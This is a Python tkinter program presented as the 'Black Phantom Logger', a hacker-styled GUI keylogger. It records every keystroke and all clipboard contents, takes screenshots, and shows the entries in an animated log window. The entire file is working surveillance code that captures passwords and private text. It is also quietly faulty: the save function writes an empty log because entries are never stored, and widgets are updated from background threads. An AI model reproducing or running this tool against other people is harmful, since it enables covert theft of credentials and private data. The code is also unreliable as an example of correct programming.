import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
from PIL import Image, ImageTk
import pynput
from pynput import keyboard
import pyperclip
import pyautogui
import os
import threading
import time
from datetime import datetime

# Initialize logging variables
log_data = []
logging_active = False
dark_mode = False  # Default: Cyberpunk Mode

# Function to capture key presses
def on_key_press(key):
    if logging_active:
        try:
            key_data = str(key.char) if hasattr(key, 'char') else str(key)
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            log_entry = f"{timestamp} - Key Pressed: {key_data}"
            animate_log_entry(log_entry)
        except Exception as e:
            print("Error:", e)

# Function to monitor clipboard
def monitor_clipboard():
    prev_clipboard = ""
    while logging_active:
        clipboard_content = pyperclip.paste()
        if clipboard_content != prev_clipboard and clipboard_content:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            log_entry = f"{timestamp} - Clipboard Copied: {clipboard_content}"
            prev_clipboard = clipboard_content
            animate_log_entry(log_entry)
        time.sleep(2)

# Function to take screenshots
def capture_screenshot():
    if logging_active:
        screenshot = pyautogui.screenshot()
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        screenshot_path = os.path.join(os.getcwd(), f"screenshot_{timestamp}.png")
        screenshot.save(screenshot_path)
        animate_log_entry(f"{timestamp} - Screenshot Captured: {screenshot_path}")

# Hacked terminal animation for log updates
def animate_log_entry(entry):
    log_textbox.config(state=tk.NORMAL)
    for char in entry:
        log_textbox.insert(tk.END, char)
        log_textbox.update_idletasks()
        time.sleep(0.02)  # Adjust typing speed
    log_textbox.insert(tk.END, "\n")
    log_textbox.yview(tk.END)
    log_textbox.config(state=tk.DISABLED)

# Function to save logs
def save_logs():
    with open("BlackPhantomLog.log", "w") as file:
        file.write("\n".join(log_data))
    messagebox.showinfo("Log Saved", "Logs have been saved successfully!")

# Function to start logging
def start_logging():
    global logging_active
    logging_active = True
    animate_log_entry("🔥 Logging Started... 🔥")

    threading.Thread(target=lambda: keyboard.Listener(on_press=on_key_press).start(), daemon=True).start()
    threading.Thread(target=monitor_clipboard, daemon=True).start()

# Function to stop logging
def stop_logging():
    global logging_active
    logging_active = False
    animate_log_entry("🛑 Logging Stopped.")

# Function to toggle dark mode
def toggle_dark_mode():
    global dark_mode
    dark_mode = not dark_mode

    if dark_mode:
        root.configure(bg="black")
        title_label.config(fg="red")
        log_textbox.config(bg="black", fg="red", insertbackground="red")
        start_button.config(bg="red", fg="black")
        stop_button.config(bg="darkred", fg="white")
        screenshot_button.config(bg="red", fg="white")
        save_button.config(bg="red", fg="white")
        dark_mode_button.config(bg="black", fg="red", text="🌙 Cyberpunk Mode")
    else:
        root.configure(bg="black")
        title_label.config(fg="#ff00ff")
        log_textbox.config(bg="black", fg="#00ff00", insertbackground="cyan")
        start_button.config(bg="#00ff00", fg="black")
        stop_button.config(bg="#ff0000", fg="white")
        screenshot_button.config(bg="#007fff", fg="white")
        save_button.config(bg="#ff00ff", fg="white")
        dark_mode_button.config(bg="black", fg="cyan", text="🌙 Dark Mode")

# GUI Setup
root = tk.Tk()
root.title("Black Phantom Logger ☠️")
root.geometry("650x550")
root.configure(bg="black")

# Load and display the logo
try:
    logo_path = "BPL.png"
    logo_image = Image.open(logo_path)
    logo_image = logo_image.resize((180, 180), Image.LANCZOS)
    logo_photo = ImageTk.PhotoImage(logo_image)

    logo_label = tk.Label(root, image=logo_photo, bg="black")
    logo_label.image = logo_photo
    logo_label.pack(pady=5)
except Exception as e:
    print("Error loading logo:", e)

# Title Label with Glitch Animation
title_label = tk.Label(root, text="☠️ BLACK PHANTOM LOGGER ☠️", fg="#ff00ff", bg="black",
                       font=("Orbitron", 16, "bold"))
title_label.pack(pady=5)

def glitch_title():
    colors = ["#ff00ff", "#00ffff", "#ff0000", "#00ff00"]
    new_color = colors[int(time.time() % len(colors))]
    title_label.config(fg=new_color)
    root.after(500, glitch_title)

glitch_title()

# Log Display Box
log_textbox = scrolledtext.ScrolledText(root, wrap=tk.WORD, height=20, width=100, bg="black",
                                        fg="#00ff00", font=("Courier New", 10), insertbackground="cyan")
log_textbox.pack(padx=10, pady=10)
log_textbox.config(state=tk.DISABLED)

# Buttons Frame
button_frame = tk.Frame(root, bg="black")
button_frame.pack(pady=10)

start_button = tk.Button(button_frame, text="▶ Start Logging", command=start_logging, bg="#00ff00",
                         fg="black", font=("Orbitron", 10, "bold"), relief="raised")
start_button.grid(row=0, column=0, padx=5, pady=5)

stop_button = tk.Button(button_frame, text="⏹ Stop Logging", command=stop_logging, bg="#ff0000",
                        fg="white", font=("Orbitron", 10, "bold"), relief="raised")
stop_button.grid(row=0, column=1, padx=5, pady=5)

screenshot_button = tk.Button(button_frame, text="📷 Screenshot", command=capture_screenshot, bg="#007fff",
                              fg="white", font=("Orbitron", 10, "bold"), relief="raised")
screenshot_button.grid(row=0, column=2, padx=5, pady=5)

save_button = tk.Button(button_frame, text="💾 Save Logs", command=save_logs, bg="#ff00ff",
                        fg="white", font=("Orbitron", 10, "bold"), relief="raised")
save_button.grid(row=0, column=3, padx=5, pady=5)

dark_mode_button = tk.Button(button_frame, text="🌙 Dark Mode", command=toggle_dark_mode, bg="black",
                             fg="cyan", font=("Orbitron", 10, "bold"), relief="raised")
dark_mode_button.grid(row=0, column=4, padx=5, pady=5)

# Run the GUI
root.mainloop()